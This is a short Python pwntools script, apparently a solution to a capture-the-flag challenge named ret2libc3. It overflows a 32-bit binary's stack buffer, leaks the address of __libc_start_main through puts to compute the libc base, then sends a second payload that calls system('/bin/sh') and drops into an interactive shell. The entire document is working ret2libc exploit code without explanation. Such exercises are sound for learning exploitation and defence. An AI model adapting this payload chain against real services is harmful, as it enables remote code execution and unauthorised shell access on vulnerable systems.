
from pwn import *

context(log_level='debug', arch='i386', os='linux')
pwnfile = './ret2libc3'
# io = remote('ipaddr', port)
io = process(pwnfile)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

libc_elf = ELF("./libc.so")

padding2ebp = 0x6C # from the var to ebp
padding = padding2ebp + context.word_size//8

puts_plt = elf.plt['puts']
main_plt = elf.symbols['_start']
puts_got = elf.got['__libc_start_main']

payload = flat([cyclic(padding), puts_plt, main_plt, puts_got])
delimiter = "\n"
io.sendlineafter(delimiter, payload)
#io.interactive()
libc_start_main_addr = u32(io.recv()[0:4])
libc_base = libc_start_main_addr - libc_elf.symbols['__libc_start_main']
system_addr = libc_base + libc_elf.symbols['system']
sh_addr = libc_base + next(libc_elf.search(b'/bin/sh'))
print(f'libc: {hex(libc_base)}, system addr: {hex(system_addr)}, sh addr: {hex(sh_addr)}')

payload = flat([cyclic(padding), system_addr, 0xdeadbeaf, sh_addr])
delimiter = "\n"
io.sendlineafter(delimiter, payload)
io.interactive()
